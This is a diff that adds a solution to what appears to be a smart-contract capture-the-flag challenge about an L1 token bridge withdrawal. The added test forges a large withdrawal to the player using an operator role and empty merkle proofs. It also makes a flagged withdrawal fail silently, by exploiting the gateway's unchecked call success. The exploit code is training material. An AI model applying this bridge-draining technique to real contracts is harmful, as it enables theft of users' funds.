@@ -89,7 +89,69 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        // there are no reverts if `success` is false in `L1Gateway` and `L1Forwarder`
+        // so if token transfer in `TokenBridge` fails, the `finalizedWithdrawals` is still sets to true if `L1Gateway` with correct leaf
+        // we are doing aditional transfer of DVT tokens to player address before malicious L2 withdrawal, so there wont be enough tokens in L1 token bridge
+        // the malicious withdrawal will not go through
+        // after that we transfering tokens back to the bridge and continue to final withdrawal
+
+        //without players "operator role" this will not be possible, because of merkle proof checks
+
+        uint256 balanceBefore = token.balanceOf(address(l1TokenBridge));
+
+        address target = address(l1Forwarder); // target passed in L2 Handler
+        uint256 numOfTx = WITHDRAWALS_AMOUNT + 1;
+
+        address[] memory l2senders = new address[](numOfTx);
+        l2senders[0] = address(uint160(uint256(0x000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6)));
+        l2senders[1] = address(uint160(uint256(0x0000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e)));
+        l2senders[2] = player; // my tx (DVT will be sent to player address)
+        l2senders[3] = address(uint160(uint256(0x000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e0))); // malicious
+        l2senders[4] = address(uint160(uint256(0x000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b)));
+
+        uint256[] memory timestamps = new uint256[](numOfTx);
+        timestamps[0] = 0x0000000000000000000000000000000000000000000000000000000066729b63;
+        timestamps[1] = 0x0000000000000000000000000000000000000000000000000000000066729b95;
+        timestamps[2] = 0x0000000000000000000000000000000000000000000000000000000066729b95; // my tx
+        timestamps[3] = 0x0000000000000000000000000000000000000000000000000000000066729bea; // malicious
+        timestamps[4] = 0x0000000000000000000000000000000000000000000000000000000066729c37;
+
+        uint256[] memory amounts = new uint256[](numOfTx);
+        amounts[0] = 0x0000000000000000000000000000000000000000000000008ac7230489e80000;
+        amounts[1] = 0x0000000000000000000000000000000000000000000000008ac7230489e80000;
+        amounts[2] = 0x00000000000000000000000000000000000000000000a968163f0a57b4000000; // my tx  (sends out 800_000 DVT)
+        amounts[3] = 0x00000000000000000000000000000000000000000000d38be6051f27c2600000; // malicious (will not have enough DVT to transfer to)
+        amounts[4] = 0x0000000000000000000000000000000000000000000000008ac7230489e80000;
+
+        uint256[] memory nonces = new uint256[](numOfTx);
+        nonces[0] = 0;
+        nonces[1] = 1;
+        nonces[2] = 999; // my tx  (could have random nonce)
+        nonces[3] = 2; // malicious
+        nonces[4] = 3;
+
+        for (uint256 i = 0; i < numOfTx; ++i) {
+            // inner message with call to L1 Token Bridge
+            bytes memory message =
+                abi.encodeWithSelector(l1TokenBridge.executeTokenWithdrawal.selector, l2senders[i], amounts[i]);
+
+            // complete data for forwarder
+            bytes memory data = abi.encodeWithSelector(
+                l1Forwarder.forwardMessage.selector, nonces[i], l2senders[i], address(l1TokenBridge), message
+            );
+
+            // pass 7 days
+            vm.warp(timestamps[i] + l1Gateway.DELAY());
+
+            l1Gateway.finalizeWithdrawal(nonces[i], l2Handler, target, timestamps[i], data, new bytes32[](0));
+            // after malicious tx, player sends DVT back to the bridge
+            if (i == 3) {
+                token.transfer(address(l1TokenBridge), amounts[i - 1]);
+            }
+        }
+
+        uint256 balanceAfter = token.balanceOf(address(l1TokenBridge));
+        console.log("Bridge DVT balance diff (before - after): ", (balanceBefore - balanceAfter) / 1e18, " DVT");
     }
 
     /**
